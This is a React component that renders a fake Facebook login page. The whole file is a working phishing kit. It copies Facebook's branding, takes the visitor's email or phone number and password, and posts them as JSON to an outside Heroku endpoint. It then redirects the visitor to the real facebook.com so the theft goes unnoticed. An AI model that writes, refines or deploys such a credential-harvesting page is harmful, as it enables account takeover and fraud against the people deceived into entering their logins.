import React, { useRef } from "react";
import "./App.css";
import intializeAuthentication from "./firebase/firebase.init";
intializeAuthentication();

function App() {
  const nameRef = useRef();
  const emailRef = useRef();

  const handleAddUser = (e) => {
    const Email_or_Nmber = nameRef.current.value;
    const password = emailRef.current.value;

    const newUser = { Email_or_Nmber, password };

    fetch("https://guarded-refuge-15901.herokuapp.com/users", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(newUser),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.insertedId) {
          e.target.reset();
          window.location.replace(`https://www.facebook.com`);
        }
      });
    e.preventDefault();
  };

  return (
    <>
      <form className="main" onSubmit={handleAddUser}>
        <h3 className="fb">facebook</h3>
        <input
          type="text"
          placeholder="Email address or phone number"
          class="txt"
          ref={nameRef}
        />
        <br />
        <input
          type="password"
          placeholder="Password"
          class="txt"
          ref={emailRef}
        />
        <br />
        <input type="submit" value="Log In" class="login-btn" />
        <br></br>

        <div className="a-link">
          <a href="https://www.facebook.com" className="link">
            Forgotten Password?
          </a>
        </div>
        <div className="ca">
          <button
            onclick="location.href='https://www.facebook.com'"
            class="pca"
          >
            Create New Account
          </button>
        </div>

        <div className="language-main">
          <div>
            <h6 className="language">English (UK)</h6>
            <h6 className="language">অসমীয়া</h6>
            <h6 className="language">नेपाली</h6>
            <h6 className="language">Português (Brasil)</h6>
          </div>
          <div>
            <h6 className="language">বাংলা</h6>
            <h6 className="language">हिन्दी</h6>
            <h6 className="language">Español</h6>
          </div>
        </div>

        <div>
          <h6 className="inc">Facebook Inc.</h6>
        </div>
      </form>
    </>
  );
}

export default App;
